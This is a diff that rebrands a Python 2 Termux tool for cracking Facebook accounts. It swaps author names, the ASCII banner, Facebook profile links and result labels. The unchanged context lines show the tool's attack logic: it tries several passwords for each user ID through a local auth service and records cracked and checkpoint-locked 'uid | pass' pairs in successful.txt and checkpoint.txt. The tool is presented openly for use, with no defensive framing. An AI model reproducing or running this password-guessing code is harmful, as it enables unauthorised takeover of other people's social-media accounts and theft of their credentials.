@@ -1,6 +1,6 @@
-# decompile by Tech Abm
-# source code by Tech Abm
-# aahil bhnchod decompile done 3:)
+# Author Ijaxo Hacker
+# Source code by Afridi
+# White Hat Hacker
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
 from multiprocessing.pool import ThreadPool
@@ -17,8 +17,8 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 os.system('termux-setup-storage')
 os.system('clear')
-logo = '\n\n\x1b[1;92m\n   _____    _________  \n  /  _  \\   \\_   ___ \\ \n /  /_\\  \\  /    \\  \\/  \x1b[1;93m SPEEDI UPDATE 2.0.1"\x1b[1;92m\n/    |    \\ \\     \\____\n\\____|__  /  \\______  /\n        \\/          \\/ \n\x1b[1;97m----------------------------------------------\n   Author   : RANA AAHIL\n   Github   : https://github.com/TheAahil\n   Youtube  : Aahil Creations\n----------------------------------------------\n             \x1b[1;92mFREE MODE ACTIVATED\n\x1b[1;97m------------------------------------------------\nBE A GOOD PERSON BUT DONT WASTE TIME TO PROVE IT\n------------------------------------------------ '
-CorrectUsername = 'Rana'
+logo = '\n\n\x1b[1;92m\n  ___   _   _  _   __\n / _ \ | | | || | / /\n/ /_\ \| |_| || |/ / x1b[1;93m IJAXO UPDATE 2.0.1"\x1b[1;92m\n/|  _  ||  _  ||    \ \n| | | || | | || |\  \\n\_| |_/\_| |_/\_| \_/\n\x1b[1;97m----------------------------------------------\n   Author   : Ijaz Afridi\n   Github   : https://github.com/Mrbadmash\n   Youtube  : Afridi Tricks\n----------------------------------------------\n             \x1b[1;92mFREE MODE ACTIVATED\n\x1b[1;97m------------------------------------------------\nBE A GOOD PERSON BUT DONT WASTE TIME TO PROVE IT\n------------------------------------------------ '
+CorrectUsername = 'AFRIDI'
 loop = 'true'
 while loop == 'true':
     print logo
@@ -51,7 +51,7 @@ def reg():
     time.sleep(5)
     print ''
     print ''
-    print '\x1b[1;92m  [Connected With Aahil Servers]'
+    print '\x1b[1;92m  [Connected With AHK Servers]'
     print ''
     os.system('fuser -k 5000/tcp &')
     os.system('#')
@@ -77,7 +77,7 @@ def reg2():
     time.sleep(2)
     print ''
     print '\x1b[1;96m '
-    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY RANA AAHIL \xe2\x80\xa2 '
+    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY IJAXO HACKER\xe2\x80\xa2 '
     time.sleep(5)
     login()
 
@@ -126,13 +126,13 @@ def menu():
     print '             LOGIN ID : ' + name
     print ''
     print 47 * '-'
-    print ' \x1b[1;91m          Kaash Koi Toh Aesa Ho'
-    print '         Jo Ander Se Bahar Jaisa Ho'
+    print ' \x1b[1;91m          𝐇𝐚𝐜𝐤𝐢𝐧𝐠 𝐢𝐬 𝐧𝐨𝐭 𝐚 𝐜𝐫𝐢𝐦𝐞 𝐢𝐭𝐬 𝐚 𝐩𝐚𝐬𝐬𝐢𝐨𝐧 '
+    print '         𝐭𝐢𝐥𝐥 𝐭𝐡𝐞 𝐭𝐢𝐦𝐞 𝐲𝐨𝐮 𝐩𝐥𝐚𝐲 𝐰𝐢𝐭𝐡 𝐢𝐭 𝐬𝐚𝐟𝐞𝐥𝐲'
     print '\x1b[1;97m'
     print 47 * '-'
     print ''
     print ' [1] START'
-    print ' [2] FOLLOW AAHIL ON FB '
+    print ' [2] FOLLOW IJAXO ON FB '
     print ' [3] CONTACT WITH OWNER '
     print ''
     menu_option()
@@ -143,10 +143,10 @@ def menu_option():
     if select == '1':
         crack()
     elif select == '2':
-        os.system('xdg-open https://www.facebook.com/aahilrana4072')
+        os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
         menu()
     elif select == '3':
-        os.system('xdg-open https://www.facebook.com/103679511141844')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100028437786275')
         menu()
     else:
         print ''
@@ -281,13 +281,13 @@ def crack_select():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;32m[AHK-OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('successful.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;91m[AHK-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('checkpoint.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -297,13 +297,13 @@ def crack_select():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;32m[AHK-OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('successful.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;91m[AHK-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('checkpoint.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -313,13 +313,13 @@ def crack_select():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;32m[AHK-OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('successful.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;91m[AHK-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('checkpoint.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -329,13 +329,13 @@ def crack_select():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;32m[AHK-OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('successful.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;91m[AHK-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('checkpoint.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
